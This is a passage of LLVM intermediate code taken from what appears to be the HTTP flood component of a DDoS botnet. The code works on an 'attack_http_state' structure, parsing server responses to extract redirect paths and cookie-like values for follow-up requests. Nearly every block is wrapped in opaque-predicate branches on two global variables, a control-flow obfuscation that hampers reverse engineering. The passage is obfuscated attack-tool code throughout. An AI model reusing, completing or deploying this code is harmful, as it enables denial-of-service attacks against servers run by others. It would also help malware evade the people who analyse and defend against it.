  %2309 = load i32, i32* %45, align 4
  %2310 = load i32, i32* %55, align 4
  %2311 = add nsw i32 %2309, %2310
  %2312 = sext i32 %2311 to i64
  %2313 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2312
  store i8* %2313, i8** %57, align 8
  %2314 = load i32, i32* %56, align 4
  %2315 = icmp sge i32 %2314, 2
  %2316 = load i32, i32* @x.19
  %2317 = load i32, i32* @y.20
  %2318 = sub i32 %2316, 1
  %2319 = mul i32 %2316, %2318
  %2320 = urem i32 %2319, 2
  %2321 = icmp eq i32 %2320, 0
  %2322 = icmp slt i32 %2317, 10
  %2323 = or i1 %2321, %2322
  br i1 %2323, label %originalBBpart2392, label %originalBB379alteredBB

originalBBpart2392:                               ; preds = %originalBB379
  br i1 %2315, label %2324, label %2327

; <label>:2324:                                   ; preds = %originalBBpart2392
  %2325 = load i32, i32* %56, align 4
  %2326 = sub nsw i32 %2325, 2
  store i32 %2326, i32* %56, align 4
  br label %2327

; <label>:2327:                                   ; preds = %2324, %originalBBpart2392
  %2328 = load i32, i32* @x.19
  %2329 = load i32, i32* @y.20
  %2330 = sub i32 %2328, 1
  %2331 = mul i32 %2328, %2330
  %2332 = urem i32 %2331, 2
  %2333 = icmp eq i32 %2332, 0
  %2334 = icmp slt i32 %2329, 10
  %2335 = or i1 %2333, %2334
  br i1 %2335, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %2327
  %2336 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2337 = load i32, i32* %45, align 4
  %2338 = sext i32 %2337 to i64
  %2339 = getelementptr inbounds i8, i8* %2336, i64 %2338
  %2340 = load i32, i32* %55, align 4
  %2341 = sext i32 %2340 to i64
  %2342 = getelementptr inbounds i8, i8* %2339, i64 %2341
  %2343 = load i32, i32* %20, align 4
  %2344 = load i32, i32* %45, align 4
  %2345 = sub nsw i32 %2343, %2344
  %2346 = load i32, i32* %55, align 4
  %2347 = sub nsw i32 %2345, %2346
  %2348 = call i32 @util_memsearch(i8* %2342, i32 %2347, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2349 = icmp sgt i32 %2348, 0
  %2350 = load i32, i32* @x.19
  %2351 = load i32, i32* @y.20
  %2352 = sub i32 %2350, 1
  %2353 = mul i32 %2350, %2352
  %2354 = urem i32 %2353, 2
  %2355 = icmp eq i32 %2354, 0
  %2356 = icmp slt i32 %2351, 10
  %2357 = or i1 %2355, %2356
  br i1 %2357, label %originalBBpart2412, label %originalBB394alteredBB

originalBBpart2412:                               ; preds = %originalBB394
  br i1 %2349, label %2358, label %2373

; <label>:2358:                                   ; preds = %originalBBpart2412
  %2359 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2360 = load i32, i32* %45, align 4
  %2361 = sext i32 %2360 to i64
  %2362 = getelementptr inbounds i8, i8* %2359, i64 %2361
  %2363 = load i32, i32* %55, align 4
  %2364 = sext i32 %2363 to i64
  %2365 = getelementptr inbounds i8, i8* %2362, i64 %2364
  %2366 = load i32, i32* %20, align 4
  %2367 = load i32, i32* %45, align 4
  %2368 = sub nsw i32 %2366, %2367
  %2369 = load i32, i32* %55, align 4
  %2370 = sub nsw i32 %2368, %2369
  %2371 = call i32 @util_memsearch(i8* %2365, i32 %2370, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2372 = sub nsw i32 %2371, 1
  store i32 %2372, i32* %56, align 4
  br label %2373

; <label>:2373:                                   ; preds = %2358, %originalBBpart2412
  %2374 = load i32, i32* %45, align 4
  %2375 = load i32, i32* %55, align 4
  %2376 = add nsw i32 %2374, %2375
  %2377 = load i32, i32* %56, align 4
  %2378 = add nsw i32 %2376, %2377
  %2379 = sext i32 %2378 to i64
  %2380 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2379
  store i8 0, i8* %2380, align 1
  store i32 0, i32* %18, align 4
  br label %2381

; <label>:2381:                                   ; preds = %2444, %2373
  %2382 = load i32, i32* @x.19
  %2383 = load i32, i32* @y.20
  %2384 = sub i32 %2382, 1
  %2385 = mul i32 %2382, %2384
  %2386 = urem i32 %2385, 2
  %2387 = icmp eq i32 %2386, 0
  %2388 = icmp slt i32 %2383, 10
  %2389 = or i1 %2387, %2388
  br i1 %2389, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %2381
  %2390 = load i32, i32* %18, align 4
  %2391 = load i8*, i8** %57, align 8
  %2392 = call i32 @util_strlen(i8* %2391)
  %2393 = icmp slt i32 %2390, %2392
  %2394 = load i32, i32* @x.19
  %2395 = load i32, i32* @y.20
  %2396 = sub i32 %2394, 1
  %2397 = mul i32 %2394, %2396
  %2398 = urem i32 %2397, 2
  %2399 = icmp eq i32 %2398, 0
  %2400 = icmp slt i32 %2395, 10
  %2401 = or i1 %2399, %2400
  br i1 %2401, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %2393, label %2402, label %2447

; <label>:2402:                                   ; preds = %originalBBpart2416
  %2403 = load i32, i32* @x.19
  %2404 = load i32, i32* @y.20
  %2405 = sub i32 %2403, 1
  %2406 = mul i32 %2403, %2405
  %2407 = urem i32 %2406, 2
  %2408 = icmp eq i32 %2407, 0
  %2409 = icmp slt i32 %2404, 10
  %2410 = or i1 %2408, %2409
  br i1 %2410, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %2402
  %2411 = load i8*, i8** %57, align 8
  %2412 = load i32, i32* %18, align 4
  %2413 = sext i32 %2412 to i64
  %2414 = getelementptr inbounds i8, i8* %2411, i64 %2413
  %2415 = load i8, i8* %2414, align 1
  %2416 = sext i8 %2415 to i32
  %2417 = icmp eq i32 %2416, 61
  %2418 = load i32, i32* @x.19
  %2419 = load i32, i32* @y.20
  %2420 = sub i32 %2418, 1
  %2421 = mul i32 %2418, %2420
  %2422 = urem i32 %2421, 2
  %2423 = icmp eq i32 %2422, 0
  %2424 = icmp slt i32 %2419, 10
  %2425 = or i1 %2423, %2424
  br i1 %2425, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br i1 %2417, label %2426, label %2427

; <label>:2426:                                   ; preds = %originalBBpart2420
  br label %2447

; <label>:2427:                                   ; preds = %originalBBpart2420
  %2428 = load i32, i32* @x.19
  %2429 = load i32, i32* @y.20
  %2430 = sub i32 %2428, 1
  %2431 = mul i32 %2428, %2430
  %2432 = urem i32 %2431, 2
  %2433 = icmp eq i32 %2432, 0
  %2434 = icmp slt i32 %2429, 10
  %2435 = or i1 %2433, %2434
  br i1 %2435, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %2427
  %2436 = load i32, i32* @x.19
  %2437 = load i32, i32* @y.20
  %2438 = sub i32 %2436, 1
  %2439 = mul i32 %2436, %2438
  %2440 = urem i32 %2439, 2
  %2441 = icmp eq i32 %2440, 0
  %2442 = icmp slt i32 %2437, 10
  %2443 = or i1 %2441, %2442
  br i1 %2443, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br label %2444

; <label>:2444:                                   ; preds = %originalBBpart2424
  %2445 = load i32, i32* %18, align 4
  %2446 = add nsw i32 %2445, 1
  store i32 %2446, i32* %18, align 4
  br label %2381

; <label>:2447:                                   ; preds = %2426, %originalBBpart2416
  %2448 = load i32, i32* @x.19
  %2449 = load i32, i32* @y.20
  %2450 = sub i32 %2448, 1
  %2451 = mul i32 %2448, %2450
  %2452 = urem i32 %2451, 2
  %2453 = icmp eq i32 %2452, 0
  %2454 = icmp slt i32 %2449, 10
  %2455 = or i1 %2453, %2454
  br i1 %2455, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %2447
  %2456 = load i8*, i8** %57, align 8
  %2457 = load i32, i32* %18, align 4
  %2458 = sext i32 %2457 to i64
  %2459 = getelementptr inbounds i8, i8* %2456, i64 %2458
  %2460 = load i8, i8* %2459, align 1
  %2461 = sext i8 %2460 to i32
  %2462 = icmp eq i32 %2461, 61
  %2463 = load i32, i32* @x.19
  %2464 = load i32, i32* @y.20
  %2465 = sub i32 %2463, 1
  %2466 = mul i32 %2463, %2465
  %2467 = urem i32 %2466, 2
  %2468 = icmp eq i32 %2467, 0
  %2469 = icmp slt i32 %2464, 10
  %2470 = or i1 %2468, %2469
  br i1 %2470, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %2462, label %2471, label %2551

; <label>:2471:                                   ; preds = %originalBBpart2428
  %2472 = load i32, i32* %18, align 4
  store i32 %2472, i32* %58, align 4
  store i32 0, i32* %59, align 4
  store i32 0, i32* %18, align 4
  br label %2473

; <label>:2473:                                   ; preds = %2524, %2471
  %2474 = load i32, i32* %18, align 4
  %2475 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2475, i32 0, i32 15
  %2477 = load i32, i32* %2476, align 4
  %2478 = icmp slt i32 %2474, %2477
  br i1 %2478, label %2479, label %2527

; <label>:2479:                                   ; preds = %2473
  %2480 = load i32, i32* @x.19
  %2481 = load i32, i32* @y.20
  %2482 = sub i32 %2480, 1
  %2483 = mul i32 %2480, %2482
  %2484 = urem i32 %2483, 2
  %2485 = icmp eq i32 %2484, 0
  %2486 = icmp slt i32 %2481, 10
  %2487 = or i1 %2485, %2486
  br i1 %2487, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %2479
  %2488 = load i8*, i8** %57, align 8
  %2489 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2489, i32 0, i32 16
  %2491 = load i32, i32* %18, align 4
  %2492 = sext i32 %2491 to i64
  %2493 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2490, i64 0, i64 %2492
  %2494 = getelementptr inbounds [128 x i8], [128 x i8]* %2493, i32 0, i32 0
  %2495 = load i32, i32* %58, align 4
  %2496 = call signext i8 @util_strncmp(i8* %2488, i8* %2494, i32 %2495)
  %2497 = icmp ne i8 %2496, 0
  %2498 = load i32, i32* @x.19
  %2499 = load i32, i32* @y.20
  %2500 = sub i32 %2498, 1
  %2501 = mul i32 %2498, %2500
  %2502 = urem i32 %2501, 2
  %2503 = icmp eq i32 %2502, 0
  %2504 = icmp slt i32 %2499, 10
  %2505 = or i1 %2503, %2504
  br i1 %2505, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %2497, label %2506, label %2523

; <label>:2506:                                   ; preds = %originalBBpart2432
  %2507 = load i32, i32* @x.19
  %2508 = load i32, i32* @y.20
  %2509 = sub i32 %2507, 1
  %2510 = mul i32 %2507, %2509
  %2511 = urem i32 %2510, 2
  %2512 = icmp eq i32 %2511, 0
  %2513 = icmp slt i32 %2508, 10
  %2514 = or i1 %2512, %2513
  br i1 %2514, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %2506
  store i32 1, i32* %59, align 4
  %2515 = load i32, i32* @x.19
  %2516 = load i32, i32* @y.20
  %2517 = sub i32 %2515, 1
  %2518 = mul i32 %2515, %2517
  %2519 = urem i32 %2518, 2
  %2520 = icmp eq i32 %2519, 0
  %2521 = icmp slt i32 %2516, 10
  %2522 = or i1 %2520, %2521
  br i1 %2522, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br label %2527

; <label>:2523:                                   ; preds = %originalBBpart2432
  br label %2524

; <label>:2524:                                   ; preds = %2523
  %2525 = load i32, i32* %18, align 4
  %2526 = add nsw i32 %2525, 1
  store i32 %2526, i32* %18, align 4
  br label %2473

; <label>:2527:                                   ; preds = %originalBBpart2436, %2473
  %2528 = load i32, i32* %59, align 4
  %2529 = icmp ne i32 %2528, 0
  br i1 %2529, label %2550, label %2530

; <label>:2530:                                   ; preds = %2527
  %2531 = load i8*, i8** %57, align 8
  %2532 = call i32 @util_strlen(i8* %2531)
  %2533 = icmp slt i32 %2532, 128
  br i1 %2533, label %2534, label %2549

; <label>:2534:                                   ; preds = %2530
  %2535 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2535, i32 0, i32 16
  %2537 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2538 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2537, i32 0, i32 15
  %2539 = load i32, i32* %2538, align 4
  %2540 = sext i32 %2539 to i64
  %2541 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2536, i64 0, i64 %2540
  %2542 = getelementptr inbounds [128 x i8], [128 x i8]* %2541, i32 0, i32 0
  %2543 = load i8*, i8** %57, align 8
  %2544 = call i32 @util_strcpy(i8* %2542, i8* %2543)
  %2545 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2545, i32 0, i32 15
  %2547 = load i32, i32* %2546, align 4
  %2548 = add nsw i32 %2547, 1
  store i32 %2548, i32* %2546, align 4
  br label %2549

; <label>:2549:                                   ; preds = %2534, %2530
  br label %2550

; <label>:2550:                                   ; preds = %2549, %2527
  br label %2551

; <label>:2551:                                   ; preds = %2550, %originalBBpart2428
  br label %2552

; <label>:2552:                                   ; preds = %2551, %originalBBpart2377
  %2553 = load i32, i32* %55, align 4
  %2554 = load i32, i32* %45, align 4
  %2555 = add nsw i32 %2554, %2553
  store i32 %2555, i32* %45, align 4
  br label %2201

; <label>:2556:                                   ; preds = %originalBBpart2352
  %2557 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2558 = load i32, i32* %20, align 4
  %2559 = call i8* @table_retrieve_val(i32 38, i32* null)
  %2560 = call i32 @util_stristr(i8* %2557, i32 %2558, i8* %2559)
  %2561 = icmp ne i32 %2560, -1
  br i1 %2561, label %2562, label %2869

; <label>:2562:                                   ; preds = %2556
  %2563 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2564 = load i32, i32* %20, align 4
  %2565 = call i8* @table_retrieve_val(i32 38, i32* null)
  %2566 = call i32 @util_stristr(i8* %2563, i32 %2564, i8* %2565)
  store i32 %2566, i32* %60, align 4
  %2567 = load i32, i32* %60, align 4
  %2568 = sext i32 %2567 to i64
  %2569 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2568
  %2570 = load i8, i8* %2569, align 1
  %2571 = sext i8 %2570 to i32
  %2572 = icmp eq i32 %2571, 32
  br i1 %2572, label %2573, label %2576

; <label>:2573:                                   ; preds = %2562
  %2574 = load i32, i32* %60, align 4
  %2575 = add nsw i32 %2574, 1
  store i32 %2575, i32* %60, align 4
  br label %2576

; <label>:2576:                                   ; preds = %2573, %2562
  %2577 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2578 = load i32, i32* %60, align 4
  %2579 = sext i32 %2578 to i64
  %2580 = getelementptr inbounds i8, i8* %2577, i64 %2579
  %2581 = load i32, i32* %20, align 4
  %2582 = load i32, i32* %60, align 4
  %2583 = sub nsw i32 %2581, %2582
  %2584 = call i32 @util_memsearch(i8* %2580, i32 %2583, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2584, i32* %61, align 4
  %2585 = load i32, i32* %61, align 4
  %2586 = icmp ne i32 %2585, -1
  br i1 %2586, label %2587, label %2868

; <label>:2587:                                   ; preds = %2576
  %2588 = load i32, i32* %60, align 4
  %2589 = sext i32 %2588 to i64
  %2590 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2589
  store i8* %2590, i8** %62, align 8
  %2591 = load i32, i32* %61, align 4
  %2592 = icmp sge i32 %2591, 2
  br i1 %2592, label %2593, label %2596

; <label>:2593:                                   ; preds = %2587
  %2594 = load i32, i32* %61, align 4
  %2595 = sub nsw i32 %2594, 2
  store i32 %2595, i32* %61, align 4
  br label %2596

; <label>:2596:                                   ; preds = %2593, %2587
  %2597 = load i32, i32* @x.19
  %2598 = load i32, i32* @y.20
  %2599 = sub i32 %2597, 1
  %2600 = mul i32 %2597, %2599
  %2601 = urem i32 %2600, 2
  %2602 = icmp eq i32 %2601, 0
  %2603 = icmp slt i32 %2598, 10
  %2604 = or i1 %2602, %2603
  br i1 %2604, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %2596
  %2605 = load i32, i32* %60, align 4
  %2606 = load i32, i32* %61, align 4
  %2607 = add nsw i32 %2605, %2606
  %2608 = sext i32 %2607 to i64
  %2609 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2608
  store i8 0, i8* %2609, align 1
  %2610 = load i32, i32* %61, align 4
  %2611 = add nsw i32 %2610, 1
  store i32 %2611, i32* %61, align 4
  %2612 = load i8*, i8** %62, align 8
  %2613 = load i32, i32* %61, align 4
  %2614 = call i32 @util_memsearch(i8* %2612, i32 %2613, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %2615 = icmp eq i32 %2614, 4
  %2616 = load i32, i32* @x.19
  %2617 = load i32, i32* @y.20
  %2618 = sub i32 %2616, 1
  %2619 = mul i32 %2616, %2618
  %2620 = urem i32 %2619, 2
  %2621 = icmp eq i32 %2620, 0
  %2622 = icmp slt i32 %2617, 10
  %2623 = or i1 %2621, %2622
  br i1 %2623, label %originalBBpart2455, label %originalBB438alteredBB

originalBBpart2455:                               ; preds = %originalBB438
  br i1 %2615, label %2624, label %2810

; <label>:2624:                                   ; preds = %originalBBpart2455
  store i32 7, i32* %18, align 4
  %2625 = load i8*, i8** %62, align 8
  %2626 = getelementptr inbounds i8, i8* %2625, i64 4
  %2627 = load i8, i8* %2626, align 1
  %2628 = sext i8 %2627 to i32
  %2629 = icmp eq i32 %2628, 115
  br i1 %2629, label %2630, label %2633

; <label>:2630:                                   ; preds = %2624
  %2631 = load i32, i32* %18, align 4
  %2632 = add nsw i32 %2631, 1
  store i32 %2632, i32* %18, align 4
  br label %2633

; <label>:2633:                                   ; preds = %2630, %2624
  %2634 = load i8*, i8** %62, align 8
  %2635 = load i8*, i8** %62, align 8
  %2636 = load i32, i32* %18, align 4
  %2637 = sext i32 %2636 to i64
  %2638 = getelementptr inbounds i8, i8* %2635, i64 %2637
  %2639 = load i32, i32* %61, align 4
  %2640 = load i32, i32* %18, align 4
  %2641 = sub nsw i32 %2639, %2640
  %2642 = sext i32 %2641 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2634, i8* %2638, i64 %2642, i32 1, i1 false)
  store i32 0, i32* %18, align 4
  br label %2643

; <label>:2643:                                   ; preds = %originalBBpart2465, %2633
  %2644 = load i8*, i8** %62, align 8
  %2645 = load i32, i32* %18, align 4
  %2646 = sext i32 %2645 to i64
  %2647 = getelementptr inbounds i8, i8* %2644, i64 %2646
  %2648 = load i8, i8* %2647, align 1
  %2649 = sext i8 %2648 to i32
  %2650 = icmp ne i32 %2649, 0
  br i1 %2650, label %2651, label %2699

; <label>:2651:                                   ; preds = %2643
  %2652 = load i8*, i8** %62, align 8
  %2653 = load i32, i32* %18, align 4
  %2654 = sext i32 %2653 to i64
  %2655 = getelementptr inbounds i8, i8* %2652, i64 %2654
  %2656 = load i8, i8* %2655, align 1
  %2657 = sext i8 %2656 to i32
  %2658 = icmp eq i32 %2657, 47
  br i1 %2658, label %2659, label %2680

; <label>:2659:                                   ; preds = %2651
  %2660 = load i32, i32* @x.19
  %2661 = load i32, i32* @y.20
  %2662 = sub i32 %2660, 1
  %2663 = mul i32 %2660, %2662
  %2664 = urem i32 %2663, 2
  %2665 = icmp eq i32 %2664, 0
  %2666 = icmp slt i32 %2661, 10
  %2667 = or i1 %2665, %2666
  br i1 %2667, label %originalBB457, label %originalBB457alteredBB

originalBB457:                                    ; preds = %originalBB457alteredBB, %2659
  %2668 = load i8*, i8** %62, align 8
  %2669 = load i32, i32* %18, align 4
  %2670 = sext i32 %2669 to i64
  %2671 = getelementptr inbounds i8, i8* %2668, i64 %2670
  store i8 0, i8* %2671, align 1
  %2672 = load i32, i32* @x.19
  %2673 = load i32, i32* @y.20
  %2674 = sub i32 %2672, 1
  %2675 = mul i32 %2672, %2674
  %2676 = urem i32 %2675, 2
  %2677 = icmp eq i32 %2676, 0
  %2678 = icmp slt i32 %2673, 10
  %2679 = or i1 %2677, %2678
  br i1 %2679, label %originalBBpart2459, label %originalBB457alteredBB

originalBBpart2459:                               ; preds = %originalBB457
  br label %2699

; <label>:2680:                                   ; preds = %2651
  %2681 = load i32, i32* @x.19
  %2682 = load i32, i32* @y.20
  %2683 = sub i32 %2681, 1
  %2684 = mul i32 %2681, %2683
  %2685 = urem i32 %2684, 2
  %2686 = icmp eq i32 %2685, 0
  %2687 = icmp slt i32 %2682, 10
  %2688 = or i1 %2686, %2687
  br i1 %2688, label %originalBB461, label %originalBB461alteredBB

originalBB461:                                    ; preds = %originalBB461alteredBB, %2680
  %2689 = load i32, i32* %18, align 4
  %2690 = add nsw i32 %2689, 1
  store i32 %2690, i32* %18, align 4
  %2691 = load i32, i32* @x.19
  %2692 = load i32, i32* @y.20
  %2693 = sub i32 %2691, 1
  %2694 = mul i32 %2691, %2693
  %2695 = urem i32 %2694, 2
  %2696 = icmp eq i32 %2695, 0
  %2697 = icmp slt i32 %2692, 10
  %2698 = or i1 %2696, %2697
  br i1 %2698, label %originalBBpart2465, label %originalBB461alteredBB

originalBBpart2465:                               ; preds = %originalBB461
  br label %2643

; <label>:2699:                                   ; preds = %originalBBpart2459, %2643
  %2700 = load i32, i32* @x.19
  %2701 = load i32, i32* @y.20
  %2702 = sub i32 %2700, 1
  %2703 = mul i32 %2700, %2702
  %2704 = urem i32 %2703, 2
  %2705 = icmp eq i32 %2704, 0
  %2706 = icmp slt i32 %2701, 10
  %2707 = or i1 %2705, %2706
  br i1 %2707, label %originalBB467, label %originalBB467alteredBB

originalBB467:                                    ; preds = %originalBB467alteredBB, %2699
  %2708 = load i8*, i8** %62, align 8
  %2709 = call i32 @util_strlen(i8* %2708)
  %2710 = icmp sgt i32 %2709, 0
  %2711 = load i32, i32* @x.19
  %2712 = load i32, i32* @y.20
  %2713 = sub i32 %2711, 1
  %2714 = mul i32 %2711, %2713
  %2715 = urem i32 %2714, 2
  %2716 = icmp eq i32 %2715, 0
  %2717 = icmp slt i32 %2712, 10
  %2718 = or i1 %2716, %2717
  br i1 %2718, label %originalBBpart2469, label %originalBB467alteredBB

originalBBpart2469:                               ; preds = %originalBB467
  br i1 %2710, label %2719, label %2745

; <label>:2719:                                   ; preds = %originalBBpart2469
  %2720 = load i8*, i8** %62, align 8
  %2721 = call i32 @util_strlen(i8* %2720)
  %2722 = icmp slt i32 %2721, 128
  br i1 %2722, label %2723, label %2745

; <label>:2723:                                   ; preds = %2719
  %2724 = load i32, i32* @x.19
  %2725 = load i32, i32* @y.20
  %2726 = sub i32 %2724, 1
  %2727 = mul i32 %2724, %2726
  %2728 = urem i32 %2727, 2
  %2729 = icmp eq i32 %2728, 0
  %2730 = icmp slt i32 %2725, 10
  %2731 = or i1 %2729, %2730
  br i1 %2731, label %originalBB471, label %originalBB471alteredBB

originalBB471:                                    ; preds = %originalBB471alteredBB, %2723
  %2732 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2733 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2732, i32 0, i32 7
  %2734 = getelementptr inbounds [129 x i8], [129 x i8]* %2733, i32 0, i32 0
  %2735 = load i8*, i8** %62, align 8
  %2736 = call i32 @util_strcpy(i8* %2734, i8* %2735)
  %2737 = load i32, i32* @x.19
  %2738 = load i32, i32* @y.20
  %2739 = sub i32 %2737, 1
  %2740 = mul i32 %2737, %2739
  %2741 = urem i32 %2740, 2
  %2742 = icmp eq i32 %2741, 0
  %2743 = icmp slt i32 %2738, 10
  %2744 = or i1 %2742, %2743
  br i1 %2744, label %originalBBpart2473, label %originalBB471alteredBB

originalBBpart2473:                               ; preds = %originalBB471
  br label %2745

; <label>:2745:                                   ; preds = %originalBBpart2473, %2719, %originalBBpart2469
  %2746 = load i8*, i8** %62, align 8
  %2747 = load i32, i32* %18, align 4
  %2748 = add nsw i32 %2747, 1
  %2749 = sext i32 %2748 to i64
  %2750 = getelementptr inbounds i8, i8* %2746, i64 %2749
  %2751 = call i32 @util_strlen(i8* %2750)
  %2752 = icmp slt i32 %2751, 256
  br i1 %2752, label %2753, label %2809

; <label>:2753:                                   ; preds = %2745
  %2754 = load i32, i32* @x.19
  %2755 = load i32, i32* @y.20
  %2756 = sub i32 %2754, 1
  %2757 = mul i32 %2754, %2756
  %2758 = urem i32 %2757, 2
  %2759 = icmp eq i32 %2758, 0
  %2760 = icmp slt i32 %2755, 10
  %2761 = or i1 %2759, %2760
  br i1 %2761, label %originalBB475, label %originalBB475alteredBB

originalBB475:                                    ; preds = %originalBB475alteredBB, %2753
  %2762 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2762, i32 0, i32 6
  %2764 = getelementptr inbounds [257 x i8], [257 x i8]* %2763, i32 0, i32 0
  %2765 = getelementptr inbounds i8, i8* %2764, i64 1
  call void @util_zero(i8* %2765, i32 255)
  %2766 = load i8*, i8** %62, align 8
  %2767 = load i32, i32* %18, align 4
  %2768 = add nsw i32 %2767, 1
  %2769 = sext i32 %2768 to i64
  %2770 = getelementptr inbounds i8, i8* %2766, i64 %2769
  %2771 = call i32 @util_strlen(i8* %2770)
  %2772 = icmp sgt i32 %2771, 0
  %2773 = load i32, i32* @x.19
  %2774 = load i32, i32* @y.20
  %2775 = sub i32 %2773, 1
  %2776 = mul i32 %2773, %2775
  %2777 = urem i32 %2776, 2
  %2778 = icmp eq i32 %2777, 0
  %2779 = icmp slt i32 %2774, 10
  %2780 = or i1 %2778, %2779
  br i1 %2780, label %originalBBpart2486, label %originalBB475alteredBB

originalBBpart2486:                               ; preds = %originalBB475
  br i1 %2772, label %2781, label %2808

; <label>:2781:                                   ; preds = %originalBBpart2486
  %2782 = load i32, i32* @x.19
  %2783 = load i32, i32* @y.20
  %2784 = sub i32 %2782, 1
  %2785 = mul i32 %2782, %2784
  %2786 = urem i32 %2785, 2
  %2787 = icmp eq i32 %2786, 0
  %2788 = icmp slt i32 %2783, 10
  %2789 = or i1 %2787, %2788
  br i1 %2789, label %originalBB488, label %originalBB488alteredBB

originalBB488:                                    ; preds = %originalBB488alteredBB, %2781
  %2790 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2790, i32 0, i32 6
  %2792 = getelementptr inbounds [257 x i8], [257 x i8]* %2791, i32 0, i32 0
  %2793 = getelementptr inbounds i8, i8* %2792, i64 1
  %2794 = load i8*, i8** %62, align 8
  %2795 = load i32, i32* %18, align 4
  %2796 = add nsw i32 %2795, 1
  %2797 = sext i32 %2796 to i64
  %2798 = getelementptr inbounds i8, i8* %2794, i64 %2797
  %2799 = call i32 @util_strcpy(i8* %2793, i8* %2798)
  %2800 = load i32, i32* @x.19
  %2801 = load i32, i32* @y.20
  %2802 = sub i32 %2800, 1
  %2803 = mul i32 %2800, %2802
  %2804 = urem i32 %2803, 2
  %2805 = icmp eq i32 %2804, 0
  %2806 = icmp slt i32 %2801, 10
  %2807 = or i1 %2805, %2806
  br i1 %2807, label %originalBBpart2495, label %originalBB488alteredBB

originalBBpart2495:                               ; preds = %originalBB488
  br label %2808

; <label>:2808:                                   ; preds = %originalBBpart2495, %originalBBpart2486
  br label %2809

; <label>:2809:                                   ; preds = %2808, %2745
  br label %2865

; <label>:2810:                                   ; preds = %originalBBpart2455
  %2811 = load i8*, i8** %62, align 8
  %2812 = getelementptr inbounds i8, i8* %2811, i64 0
  %2813 = load i8, i8* %2812, align 1
  %2814 = sext i8 %2813 to i32
  %2815 = icmp eq i32 %2814, 47
  br i1 %2815, label %2816, label %2864

; <label>:2816:                                   ; preds = %2810
  %2817 = load i32, i32* @x.19
  %2818 = load i32, i32* @y.20
  %2819 = sub i32 %2817, 1
  %2820 = mul i32 %2817, %2819
  %2821 = urem i32 %2820, 2
  %2822 = icmp eq i32 %2821, 0
  %2823 = icmp slt i32 %2818, 10
  %2824 = or i1 %2822, %2823
  br i1 %2824, label %originalBB497, label %originalBB497alteredBB

originalBB497:                                    ; preds = %originalBB497alteredBB, %2816
  %2825 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2826 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2825, i32 0, i32 6
  %2827 = getelementptr inbounds [257 x i8], [257 x i8]* %2826, i32 0, i32 0
  %2828 = getelementptr inbounds i8, i8* %2827, i64 1
  call void @util_zero(i8* %2828, i32 255)
  %2829 = load i8*, i8** %62, align 8
  %2830 = load i32, i32* %18, align 4
  %2831 = add nsw i32 %2830, 1
  %2832 = sext i32 %2831 to i64
  %2833 = getelementptr inbounds i8, i8* %2829, i64 %2832
  %2834 = call i32 @util_strlen(i8* %2833)
  %2835 = icmp sgt i32 %2834, 0
